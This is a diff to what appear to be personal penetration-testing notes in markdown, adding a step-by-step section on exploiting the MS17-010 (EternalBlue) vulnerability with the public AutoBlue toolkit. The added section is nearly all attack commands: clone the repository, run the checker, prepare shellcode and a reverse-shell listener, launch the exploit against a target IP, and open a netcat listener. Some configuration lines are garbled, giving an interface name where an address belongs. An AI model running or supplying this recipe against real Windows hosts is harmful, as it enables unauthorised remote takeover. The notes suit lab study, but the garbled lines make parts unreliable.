@@ -129,4 +129,36 @@ However, these are typically not direct remote code execution vulnerabilities an
     
     gain nt authority access
 
-#**Manual Exploitation With Reverse TCP Shell**
+# **Manual Exploitation With Reverse TCP Shell [Leveraging Metasploit Reverse Shell Framework]**
+
+## **EndGame GitHub**
+    cd /opt/
+    git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
+    cd autoblue-ms17-010/
+    
+### **Check**
+    run python eternal_checker.py <TARGET-IP>
+
+### **Python3 requirements install**
+    pip install -r requirements.txt
+
+### **Configuration of Shell code and reverse listener**
+    cd shellcode/
+    ./shell_prep.sh
+    LPORT for reverse connection: eth0
+    LPORT for listener on x64: 9999
+    LPORT for listener on x86: 2222
+    
+    cd..
+    ./listener_prep.sh
+    LPORT for reverse connection: eth0
+    LPORT for listener on x64: 9999
+    LPORT for listener on x86: 2222
+
+    python eternalblue_exploit7.py 192.168.64.131
+
+## **In the event we cannot use the Metasploit Shell Framework**
+
+### **Setting Netcat alternative**
+    netcat -nlvp 9999
+    
